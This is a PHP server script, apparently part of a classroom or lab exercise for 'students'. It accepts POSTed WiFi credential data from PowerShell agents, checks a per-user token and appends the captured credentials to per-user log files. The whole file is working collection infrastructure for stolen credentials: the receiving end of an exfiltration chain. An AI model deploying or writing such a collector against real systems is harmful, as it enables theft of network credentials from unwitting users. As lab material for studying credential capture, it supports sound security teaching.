<?php
/**
 * upload.php – Receives WiFi credential data from PowerShell agents.
 *
 * Each student gets a unique API token (their username, or a token you
 * set in users.json). The PowerShell agent sends:
 *   POST /upload.php
 *   Headers: X-Student-Token: <username>   (or use ?token=<username>)
 *   Body:    CSV line(s) of captured data
 *
 * Data is appended to creds/<username>_wifi_creds.log
 */

define('USERS_FILE', __DIR__ . '/users.json');
define('CREDS_DIR',  __DIR__ . '/creds');

if (!is_dir(CREDS_DIR)) mkdir(CREDS_DIR, 0755, true);

function load_users(): array {
    if (!file_exists(USERS_FILE)) return [];
    $data = json_decode(file_get_contents(USERS_FILE), true);
    return $data['users'] ?? [];
}

// Accept token from header or query string
$token = $_SERVER['HTTP_X_STUDENT_TOKEN'] ?? ($_GET['token'] ?? '');
$token = trim($token);

if ($token === '') {
    http_response_code(401);
    echo json_encode(['error' => 'Missing token']);
    exit;
}

// Validate token against known usernames
$validUser = null;
foreach (load_users() as $u) {
    if (strtolower($u['username']) === strtolower($token) && ($u['active'] ?? true)) {
        $validUser = $u['username'];
        break;
    }
}

if ($validUser === null) {
    http_response_code(403);
    echo json_encode(['error' => 'Invalid or disabled token']);
    exit;
}

// Only accept POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'POST required']);
    exit;
}

$body = file_get_contents('php://input');
if ($body === '' || $body === false) {
    http_response_code(400);
    echo json_encode(['error' => 'Empty body']);
    exit;
}

// Sanitise username for filename
$safe    = preg_replace('/[^a-z0-9_\-]/i', '_', $validUser);
$logFile = CREDS_DIR . '/' . $safe . '_wifi_creds.log';

// Append the line(s) – ensure newline separation
file_put_contents($logFile, rtrim($body) . PHP_EOL, FILE_APPEND | LOCK_EX);

http_response_code(200);
echo json_encode(['status' => 'ok', 'user' => $validUser]);
